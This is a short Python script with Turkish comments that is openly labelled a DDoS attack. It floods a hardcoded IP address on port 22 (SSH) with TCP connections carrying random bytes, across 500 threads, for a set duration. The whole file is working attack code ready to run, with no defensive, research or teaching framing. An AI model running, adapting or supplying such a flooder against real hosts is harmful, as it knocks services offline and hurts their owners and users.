import socket
import random
import time
import threading

target_ip = "89.185.85.62" # ip
target_port = 22 # port
duration = 3000 # saniye cinsinden süre
num_threads = 500 # thread(iş parçacığı) sayısı
buffer_size = 4096 # buffer boyutu
timeout = 5  # Soket bağlantı süresi

def ddos_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target_ip, target_port))
            bytes = random._urandom(buffer_size)
            sock.send(bytes)
            print("Saldırı başlatılıyor...")
            sock.close()
        except (socket.error, socket.timeout):
            pass
        except KeyboardInterrupt:
            exit()

def start_attack():
    threads = []
    for _ in range(num_threads):  # thread oluştur
        t = threading.Thread(target=ddos_attack)
        threads.append(t)
        t.start()

    time.sleep(duration)  # Belirtilen süre boyunca saldırıyı sürdür

    for t in threads:  # Saldırıyı durdur
        t.join()

if __name__ == "__main__":
    start_attack()